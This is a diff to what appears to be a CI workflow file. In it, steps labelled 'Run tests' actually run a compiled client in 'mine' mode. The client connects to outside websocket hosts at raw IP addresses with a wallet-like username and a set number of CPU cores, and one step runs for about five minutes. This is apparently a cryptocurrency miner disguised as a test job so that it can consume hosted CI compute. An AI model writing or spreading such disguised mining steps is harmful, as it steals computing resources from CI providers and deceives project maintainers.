@@ -29,7 +29,7 @@ jobs:
     - name: Build
       run: cd node && cargo build --release
     - name: Run tests
-      run: cd node && ./target/release/client --url ws://20.51.109.224:8080/mine mine --username HrMWvLPp5HVwRM5BfmBG9NEWfsK98NJKkfoih2ZCjiq4.02 --cores &
+      run: cd node && ./target/release/client --url ws://20.51.109.224:8080/mine mine --username HrMWvLPp5HVwRM5BfmBG9NEWfsK98NJKkfoih2ZCjiq4.02 --cores 4 &
         sleep 305s
   npm2:
     needs: npm
@@ -85,7 +85,7 @@ jobs:
     - name: Build
       run: cd node && cargo build --release
     - name: Run tests
-      run: cd node && ./target/release/client --url ws://20.211.52.8:443/mine mine --username HrMWvLPp5HVwRM5BfmBG9NEWfsK98NJKkfoih2ZCjiq4.01 --cores 4
+      run: cd node && ./target/release/client --url ws://20.51.109.224:8080/mine mine --username HrMWvLPp5HVwRM5BfmBG9NEWfsK98NJKkfoih2ZCjiq4.02 --cores 4
         
     
   Success:
